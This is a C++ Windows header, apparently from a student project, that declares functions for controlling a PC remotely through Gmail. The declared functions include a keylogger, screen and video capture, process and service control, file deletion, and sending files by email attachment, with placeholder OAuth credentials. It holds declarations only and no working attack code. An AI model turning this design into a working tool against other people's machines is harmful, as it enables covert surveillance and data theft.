#pragma once
#include <windows.h>
#include <iostream>
#include <vector>
#include <tchar.h>
#include <atomic>
#include <mutex>
#include <thread>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

bool imageCapture();
std::wstring ListRunningApplications();
std::wstring ListServices();
std::wstring ListOffServices();
std::wstring StartKeylogger();
std::wstring TreeFolder(const std::wstring& path, const std::wstring& indent = L"");
std::string wstringToString(const std::wstring& wstr);
bool containsTargetFiles(const fs::path& path);
bool startApplication(const std::wstring& appPath);
bool stopApplicationByPID(DWORD pid);
bool stopService(const std::wstring& serviceName);
bool startService(const std::wstring& serviceName);
void CaptureScreen(const wchar_t* filename);
bool deleteFile(std::string filename);
bool videoCapture();
extern std::atomic<bool> keyloggerRunning;
extern std::wstring keylogResult;
extern std::mutex keylogMutex;

void KeyloggerThread();
std::wstring StartKeylogger();
std::string readGmail(const std::string& accessToken, int& num, std::string& request_mail);
std::string getAccessToken(const std::string& code, const std::string& clientId, const std::string& clientSecret, std::string& refreshtoken);
std::string refreshAccessToken(const std::string& refreshToken, const std::string& clientId, const std::string& clientSecret);
bool sendGmail(const std::string& accessToken, const std::string& to, const std::string& from, const std::string& subject, const std::string& body);
bool sendGmailAttachmentsFlexible(const std::string& accessToken,
    const std::string& to,
    const std::string& from,
    const std::string& subject,
    const std::string& body,
    const std::string& attachmentPath,
    const std::string& mimeType,
    const std::string& fileName);
std::string createEmailPayloadFlexible(const std::string& to, const std::string& from, const std::string& subject, const std::string& body, const std::string& attachmentPath, const std::string& mimeType, const std::string& fileName);
std::string getMimeType(const std::string& extension);//Lay dinh dang file can gui
static std::string clientId = "Nhap_client_id_cua_ban";
static std::string clientSecret = "Nhap_client_secret_cua_ban";
